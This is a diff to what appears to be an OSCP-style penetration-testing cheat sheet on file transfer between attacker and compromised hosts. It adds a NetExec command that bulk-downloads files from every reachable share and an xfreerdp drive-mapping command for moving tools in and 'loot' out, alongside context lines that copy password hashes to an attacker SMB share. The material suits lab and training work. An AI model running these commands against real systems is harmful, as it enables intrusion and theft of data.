@@ -112,6 +112,21 @@ copy C:\loot\hashes.txt \\10.10.14.5\SHARE\hashes.txt
 **Explanation:** Same mechanism in reverse — the SMB share is bidirectional by default (unless `-readonly` was passed to `smbserver.py`), so this single server handles both push and pull.
 **Source:** https://0xdf.gitlab.io/2018/10/11/pwk-notes-post-exploitation-windows-file-transfers.html
 
+**Faster (nxc):** once creds are known, `nxc smb target -u user -p pass -M spider_plus` enumerates and bulk-downloads every reachable file across every accessible share in one command, instead of hand-`copy`-ing loot files one at a time once you're already browsing shares.
+**Source:** https://www.netexec.wiki/smb-protocol/spidering-shares/spider-plus
+
+---
+
+### 2b. RDP — drive mapping / clipboard file transfer
+
+**Title:** `xfreerdp` drive redirection — mount a local folder as a drive inside the RDP session
+**Command:**
+```bash
+xfreerdp /v:10.10.10.10 /u:user /p:'Password123' /drive:kali,/tmp/share +clipboard
+```
+**Explanation:** `/drive:<name>,<local-path>` exposes `/tmp/share` on the attacker box as a mapped network drive (`\\tsclient\kali`) inside the RDP session — copy tools in or loot out through normal Windows Explorer/`copy` against that path, no separate transfer channel needed once RDP access exists. `+clipboard` additionally enables clipboard redirection so text (and, on modern xfreerdp builds, small files) can be copied between host and target directly — the fallback already referenced elsewhere in this doc for base64 chunk-and-paste when no other channel is available.
+**Source:** https://github.com/FreeRDP/FreeRDP/wiki/CommandLineInterface
+
 ---
 
 ### 3. Attacker Linux → Target Linux (pull-based, HTTP)
@@ -225,6 +240,7 @@ sed -n '/^\r$/,$p' /tmp/out.raw | tail -n +2 > /tmp/nc
 | `bitsadmin /transfer` | Linux (hosts file) | Windows | Pull | Yes | No | Blends with BITS/Windows Update traffic |
 | `powershell -enc` | Linux (encodes) | Windows | Push (inline) | No (if payload embedded) | No | Small scripts/blobs, avoids quoting issues |
 | `impacket-smbserver` + `copy`/`net use` | Linux | Windows | Push & Pull | Yes (SMB/445) | Optional | Native `copy` cmd, blends with file-share traffic; also used for loot exfil |
+| `xfreerdp /drive:` + clipboard | Linux | Windows | Push & Pull | Yes (RDP/3389) | Yes | Drive mapping/clipboard once RDP access exists, common OSCP AD access path |
 | `wget` | Linux | Linux | Pull | Yes | No | Standard non-interactive downloader (Debian/Ubuntu default) |
 | `curl` | Linux | Linux/Windows | Pull | Yes | No | More portable than wget; native on modern Windows too |
 | `scp` (+ `sshpass`) | Linux/Windows | Linux (or Windows w/ OpenSSH) | Push & Pull | Yes | Yes | Once valid creds/keys obtained |
